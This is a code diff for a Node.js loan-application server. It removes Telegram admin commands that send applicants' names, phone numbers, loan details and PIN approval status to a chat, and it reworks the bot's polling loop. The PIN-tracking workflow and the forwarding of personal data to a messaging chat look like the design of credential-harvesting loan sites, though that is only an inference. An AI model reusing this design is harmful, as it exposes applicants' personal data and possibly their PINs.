-    if (!result.rows.length) {
-      await sendTelegram(chatId, 'No pending applications.');
-    } else {
-      for (const item of result.rows) {
-        await sendTelegram(
-          chatId,
-          `${item.id}\n${item.first_name} ${item.last_name} — ${item.phone}\n` +
-          `USD ${item.loan_amount} / ${item.loan_term}`
-        );
-      }
-    }
-  } else if (text === '/pendingpins') {
-    const result = await pool.query(
-      `SELECT id,first_name,last_name,phone
-       FROM applications
-       WHERE pin_status='pending'
-       ORDER BY created_at DESC
-       LIMIT 20`
-    );
-
-    if (!result.rows.length) {
-      await sendTelegram(chatId, 'No PINs awaiting approval.');
-    } else {
-      for (const item of result.rows) {
-        await sendTelegram(
-          chatId,
-          `${item.id}\n${item.first_name} ${item.last_name} — ${item.phone}`
-        );
-      }
-    }
-  } else if (text.startsWith('/status')) {
-    const parts = text.split(/\s+/);
-    const id = parts[1];
-
-    if (!id || !/^[0-9a-f-]{36}$/i.test(id)) {
-      await sendTelegram(chatId, 'Usage: /status APPLICATION_ID');
-      return;
-    }
-
-    const result = await pool.query(
-      `SELECT id,first_name,last_name,phone,status,pin_status,created_at
-         FROM applications WHERE id=$1`,
-      [id]
-    );
-
-    const row = result.rows[0];
-
-    if (!row) {
-      await sendTelegram(chatId, 'Application not found.');
-    } else {
-      await sendTelegram(
-        chatId,
-        `${row.first_name} ${row.last_name} — ${row.phone}\n` +
-        `Application: ${row.status}\n` +
-        `PIN: ${row.pin_status}\n` +
-        `Submitted: ${new Date(row.created_at).toISOString()}`
-      );
-    }
-  } else if (text === '/whoami') {
-    await sendTelegram(
-      chatId,
-      `chat_id: ${chatId}\nuser_id: ${fromId}`
-    );
   }
 }
 
-async function startTelegramPolling() {
-  if (!BOT_TOKEN || telegramPolling) return;
+// TELEGRAM POLLING SETUP
 
+async function pollTelegram() {
+  if (!BOT_TOKEN || telegramPolling) return;
   telegramPolling = true;
 
-  await telegramApi('deleteWebhook', { drop_pending_updates: false })
-    .catch(error => console.warn('deleteWebhook failed:', error.message));
-
-  // eslint-disable-next-line no-constant-condition
-  while (true) {
+  while (telegramPolling) {
     try {
       const updates = await telegramApi('getUpdates', {
         offset: telegramOffset,
-        timeout: 25,
+        timeout: 30,
         allowed_updates: ['message', 'callback_query']
       });
 
-      if (Array.isArray(updates)) {
+      if (updates && updates.length > 0) {
         for (const update of updates) {
           telegramOffset = update.update_id + 1;
-
-          try {
-            await processTelegramUpdate(update);
-          } catch (error) {
-            console.error('Telegram update processing failed:', error.message);
-          }
+          await processTelegramUpdate(update);
         }
       }
     } catch (error) {
       console.error('Telegram polling error:', error.message);
-      await new Promise(resolve => setTimeout(resolve, 3000));
+      await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds before retrying
     }
   }
 }
-
-startTelegramPolling().catch(error => {
-  console.error('Telegram polling could not start:', error.message);
-});
 
 // START SERVER
 
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
+  dbReady.then(() => {
+    console.log('Database ready.');
+    pollTelegram(); // Start listening for Telegram messages
+  }).catch(err => {
+    console.error('Failed to start Telegram polling due to DB error:', err);
+  });
 });
+  
